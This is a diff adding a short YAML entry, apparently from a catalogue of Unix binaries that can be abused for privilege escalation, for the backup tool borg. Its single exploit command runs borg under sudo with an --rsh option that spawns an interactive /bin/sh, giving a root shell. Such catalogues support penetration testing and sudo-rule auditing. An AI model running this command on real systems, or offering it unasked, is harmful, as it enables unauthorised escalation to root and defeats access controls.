@@ -1,0 +1,5 @@
+name: borg
+binary_path: /usr/bin/borg
+exploit_cmds:
+- 'sudo /usr/bin/borg extract @:/::: --rsh "/bin/sh -c ''/bin/sh </dev/tty >/dev/tty
+  2>/dev/tty''"'
